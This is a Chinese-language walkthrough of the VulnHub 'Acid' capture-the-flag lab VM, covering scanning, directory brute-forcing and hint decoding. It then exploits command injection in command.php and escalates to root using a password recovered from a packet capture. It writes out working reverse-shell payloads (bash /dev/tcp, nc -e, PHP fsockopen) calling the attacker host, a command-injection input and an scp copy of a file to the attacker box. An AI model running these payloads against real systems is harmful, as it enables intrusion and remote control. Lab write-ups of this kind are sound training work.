# VulnHub|渗透测试入门（一）

阅读量 **382000**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-04-24 16:41:29

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01b412f6e263439314.png)

红日安全成员  
博客：<http://sec-redclub.com/team/>

## 简介

####  下载链接

`https://download.vulnhub.com/acid/Acid.rar`

####  靶机说明

Welcome to the world of Acid.  
Fairy tails uses secret keys to open the magical doors.

欢迎来到酸的世界。童话故事需要使用秘密钥匙打开魔法门。

####  目标

获得root权限和flag。

####  运行环境

  * 靶机配置：该虚拟机完全基于Web，提取rar并使用VMplayer运行vmx，网络连接方式设置为net，靶机自动获取IP。
  * 攻击机配置：同网段下有Windows攻击机，安装有Burpsuit、nc、Python2.7、DirBuster、御剑等渗透工具。

## 信息收集

  * ip发现

启用Acid虚拟机，由于网络设置为net模式，使用Nmap扫描VMware Network Adapter
VMnet8网卡的NAT网段，即可找到虚机IP，扫描结果保存到txt文件，命令：

`nmap -sP 192.168.64.0/24 -oN acid-ip.txt`

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/1.png)

获得目标ip `192.168.64.153`

  * 端口扫描

使用nmap扫描1-65535全端口，并做服务指纹识别，扫描结果保存到txt文件，命令：

`map -p1-65535 -sV -oN acid-port.txt 192.168.64.153`

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/2.png)

目标主机的33447端口发现web服务，web服务器是Apache2.4.10，操作系统ubuntu。

`http://192.168.64.153:33447` 进入主页：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/3.png)

  * 服务识别

只发现web服务和Apache，只能从web漏洞或者Apache漏洞入手（如有漏洞）：

端口：Tcp 33447

底层服务：Apache2.4.10

操作系统：Ubuntu

## 漏洞挖掘的详细思路

  * web挖掘思路：

(1) 查看每个网页的源码，看是否有提示；

(2) 暴破目录，用御剑或DirBuster，看是否有新网页，找新网页的漏洞；

  * Apache挖掘思路：

(1) 寻找Apache2.4.10有无已知漏洞可利用：没有发现可直接利用的漏洞。

(2) 到www.exploit-db.com查询有无exp：没有找到exp。

(3) Nessus扫描一下主机漏洞：没有扫描出漏洞。

  * 实在找不到漏洞：单用户模式进入Ubuntu，看源码吧。

  * 步骤1：首先看主页源码，发现提示：0x643239334c6d70775a773d3d

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/4.png)

0x是16进制编码，将值643239334c6d70775a773d3d进行ASCII hex转码，变成：d293LmpwZw==

发现是base64编码，再进行解码，得到图片信息 wow.jpg

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/5.png)

这时可以根据经验在首页直接加目录打：/image/wow.jpg 或者 /images/wow.jpg 或者 /icon/wow.jpg
网站的图片目录通常是这样命名。也可以利用dirbuster进行目录爆破，得到图片目录images。

  * 访问 `http://192.168.64.153:33447/images/wow.jpg` 得到图片：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/6.png)

  * 将图片保存到本地，用Notepad++打开，发现最下边有提示

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/7.png)

将3761656530663664353838656439393035656533376631366137633631306434进行ASCII
hex转码，得到 7aee0f6d588ed9905ee37f16a7c610d4，这是一串md5。

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/8.png)

去cmd5解密，得到63425，推测是一个密码或者ID。

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/9.png)

  * 步骤2：使用Dirbuster进行目录暴破：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/10.png)

查看暴破结果：发现challenge目录，该目录下有cake.php、include.php、hacked.php，用Burpsuit挂上代理，使用Firefox然后依次访问3个文件：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/11.png)

  * 步骤3：访问cake.php，发现需要登录后才能访问：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/12.png)

该页面如果看页面title或者看burpsuit的Response返回值的<title>/Magic_Box</title>，会发现有/Magic_Box目录存在，先看其他页面。

点击login会跳转到index.php登录页面，需要email和密码才能登录：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/13.png)

  * 步骤4：访问include.php，这是一个文件包含漏洞页面：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/14.png)

在输入框中输入 /etc/passwd 测试存在文件包含，Burpsuit显示response包如下：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/15.png)

想文件包含拿shell，但没有文件上传点，之前发现的wow.jpg中无木马可包含。先继续看hacked.php。

  * 步骤5：访问cake.php，需要输入ID，测试下之前从wow.jpg解密出来的数字：63425

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/16.png)

然后，什么也没有发生，看来ID不对，或者需要先通过index页面输入email和密码登录。

  * 步骤6：找注入，把发现的几个页面都送入AWVS扫描了漏洞，未发现注入。

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/17.png)

  * 步骤7：继续暴破发现的Magic_Box目录：发现low.php,command.php

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/18.png)

  * 步骤8：访问low.php是个空页面，访问command.php，发现命令执行界面：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/19.png)

可执行系统命令，输入192.168.64.1;id 查看burpsuit的response发现id命令执行成功。

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/20.png)

## 获取shell

  * 步骤9：利用php反弹shell。Windows开启nc，监听4444端口：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/21.png)

为避免转义和中断，在get、post请求中输入payload需要进行url编码。尝试bash反弹shell、nc反弹shell，如下payload都失败：

`bash -i >& /dev/tcp/192.168.64.1/4444 0>&1`

`nc -e /bin/bash -d 192.168.64.1 4444`

通过php反弹shell成功，将如下payload进行URL编码后，在burp中发送：

`php -r '$sock=fsockopen("192.168.64.1",4444);exec("/bin/sh -i <&3 >&3
2>&3");'`

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/22.png)

nc成功接收反弹shelll：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/23.png)

但是无法执行su命令，回显su: must be run from a terminal
需要一个终端。没有想出办法，最终google了一下，找到答案：用python调用本地的shell，命令：

`echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py`

`python /tmp/asdf.py`

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/24.png)

执行su成功：

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/25.png)

##

## 提升权限

  * 步骤10：查看有哪些的用户 `cat /etc/passwd`,发现需要关注的用户有：acid,saman,root

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/26.png)

  * 步骤11：查找每个用户的文件（不显示错误） `find / -user acid 2>/dev/null`

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/27.png)

发现/sbin/raw_vs_isi/hint.pcapng文件，这是一个网络流量抓包文件，将其拷贝的kali上，用Wireshark打开：

`scp /sbin/raw_vs_isi/hint.pcapng
[root@10.10.10](mailto:root@10.10.10).140:/root/`

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/28.png)

只看TCP协议的包，发现saman的密码：1337hax0r

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/29.png)

  * 步骤12：su提权到saman、root，获得flag

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/30.png)

再使用sudo -i 提权到root，密码同样是1337hax0r，获得位于root目录的flag.txt。

![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/vulnhub/_image/31.png)

###  靶场思路回顾

作者的设计思路可参考国外的一篇渗透文章：  
`http://resources.infosecinstitute.com/acid-server-ctf-walkthroug`h  
主要突破点是：

1.两次目录暴破，第一次暴破出challenge，目录、cake.php、include.php、hacked.php，第二次暴破Magic_Box目录发现command.php。

2.发现命令执行界面后，用php反弹shell，在http中传输需对payload进行url编码。

3.su提权需要一个终端，没有经验只能Google解决了。

4.提权的方法是通过查找已知用户的文件，发现其密码，未使用exp或msf提权。

## 总结

1.主要收获：

(1)命令执行漏洞可使用php反弹shell, 以前都是用bash或nc。

(2)su提权需要一个终端，使用Python解决。

(3)获得shell后，多多查找各个用户文件，可能有新发现。

2.踩到的坑：

(1)文件包含漏洞，没找到利用方式，也找不到上传点，无法包含获得shell；

(2)su提权需要一个终端，没有知识储备和经验，依靠高手指导和Google搜索解决。

(3)index.php页面获得邮件用户名和密码的方法太冷门了，如果不是看国外的教程，自己无法想到。

(4)发现目录就暴破下，使用御剑默认字典不行，只能使用OWASP的暴破字典，目录暴破绕过了上面邮件用户名和口令的登录，可以一路暴破到命令执行页面。

总之，在没有google搜索和他人的指导下，自己没能独立完成，后续需要开阔思路，多多练习。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **红日安全** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/105462](/post/id/105462)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [安全靶场](/tag/安全靶场)

 **+1** __5赞

 __收藏

![](https://p0.ssl.qhimg.com/t016ee9c4873ed735a1.png) 红日安全

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

